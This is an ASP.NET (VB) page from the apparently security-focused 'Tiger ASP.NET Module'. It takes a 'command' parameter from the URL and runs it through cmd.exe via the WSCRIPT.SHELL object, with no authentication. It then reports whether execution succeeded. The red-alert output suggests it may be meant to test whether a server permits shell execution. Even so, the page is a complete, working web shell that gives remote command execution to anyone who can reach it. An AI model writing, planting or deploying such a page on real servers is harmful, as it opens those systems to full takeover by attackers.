<%--
Tiger ASP.NET Module
Copyright (C) 2007 Boris Maletic

This program is free software; you can redistribute it and/or modify it under 
the terms of the GNU General Public License as published by the Free Software Foundation;
either version 2 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program;
if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
--%>

<%@ Page Language="VB" %>

<script runat="server">
    Public Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
        
        'Response.ContentType = "text/xml"
        Response.ContentType = "text/plain"
        Response.ContentEncoding = System.Text.Encoding.UTF8

        Dim wshObject As Object = Nothing
        Dim commandToExecute As String = ""
        
        Try
            commandToExecute = Request.QueryString("command")
        Catch ex As Exception
        End Try
        
        Try
            wshObject = CreateObject("WSCRIPT.SHELL")
            
            Try
                Dim retCode As Integer = wshObject.Run("cmd.exe /c " + commandToExecute, 0, True)
                Response.Write("<Alert:Red>" & vbCrLf)
                Response.Write("Successfully executed the '" & commandToExecute & "' command using cmd.exe. Return code was '" & retCode.ToString() & "'.")
            Catch ex As Exception
                Response.Write("<Alert:Yellow>" & vbCrLf)
                Response.Write("Succcessfully created the WSH (SWSCRIPT.SHELL) object, but failed to execute the '" + commandToExecute + "' command using cmd.exe.")
            End Try
        Catch ex As Exception
            Response.Write("The WSH (SWSCRIPT.SHELL) object could not be created.")
        End Try
            
    End Sub
</script>
